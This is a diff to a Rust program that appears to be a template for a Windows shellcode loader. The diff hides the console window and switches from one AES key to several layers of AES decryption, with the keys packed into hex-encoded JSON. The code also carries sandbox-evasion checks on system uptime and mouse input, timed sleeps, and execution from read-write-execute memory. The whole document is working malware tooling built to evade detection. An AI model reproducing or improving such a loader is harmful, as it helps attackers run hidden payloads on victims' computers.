@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 extern crate alloc;
 
 use alloc::ffi::CString;
@@ -16,6 +16,7 @@ use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 use winapi::um::sysinfoapi::GetTickCount;
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use winapi::um::winuser::{GetCursorPos, GetLastInputInfo, LASTINPUTINFO, MOUSEMOVEPOINT};
+use serde::{Deserialize, Serialize};
 
 type CustomVirtualAlloc = unsafe extern "system" fn(
     lpAddress: *mut winapi::ctypes::c_void,
@@ -24,6 +25,11 @@ type CustomVirtualAlloc = unsafe extern "system" fn(
     flProtect: u32,
 ) -> *mut winapi::ctypes::c_void;
 
+#[derive(Serialize, Deserialize)]
+pub struct ScInfo{
+    base64_str:String,
+    kv:Vec<(String,String)>
+}
 
 fn main() {
     unsafe {
@@ -33,14 +39,20 @@ fn main() {
         }
     }
     thread::sleep(Duration::from_secs(2));
-    // 还原
-    let key = String::from("${key}");
-    let iv = String::from("${iv}");
     //编译混淆
     let hexDecode = hex::decode(s!("${hexCode}")).expect("hex decode err");
-    let aesShellCode = base64::decode(hexDecode).unwrap();
+    let sc_info: ScInfo = serde_json::from_slice(hexDecode.as_slice()).unwrap();
+    let string = sc_info.base64_str;
+    let map = sc_info.kv;
+    let pairs = map.iter().rev();
+    let mut  aesShellCode = base64::decode(string).unwrap();
+    for (key, value) in pairs {
+        aesShellCode = aesDecrypt(&key, &value, aesShellCode);
+    }
+
+
     thread::sleep(Duration::from_secs(1));
-    let shellCode = aesDecrypt(key, iv, aesShellCode);
+    let shellCode = &aesShellCode;
 
     let flen = shellCode.len();
     thread::sleep(Duration::from_secs(2));
@@ -75,14 +87,15 @@ fn main() {
     };
 }
 
-pub fn aesDecrypt(key: String, iv: String, ciphertext: Vec<u8>) -> Vec<u8> {
-    let cipher = Cipher::new_128(&key.as_bytes()[0..16].try_into().unwrap());
+pub fn aesDecrypt(key: &String, iv: &String, ciphertext: Vec<u8>) -> Vec<u8> {
+    let cipher = Cipher::new_128(key.as_bytes()[0..16].try_into().unwrap());
     cipher.cbc_decrypt(iv.as_bytes(), &ciphertext)
 }
 
 pub unsafe fn analy_environment() -> bool {
     let tick_count = GetTickCount();
     if tick_count <= 3600000 {
+        println!("开机时间过短");
         return false;
     }
     println!("系统启动以来的毫秒数: {}", tick_count);
@@ -108,4 +121,5 @@ pub unsafe fn analy_environment() -> bool {
 
     return false;
 }
+
 
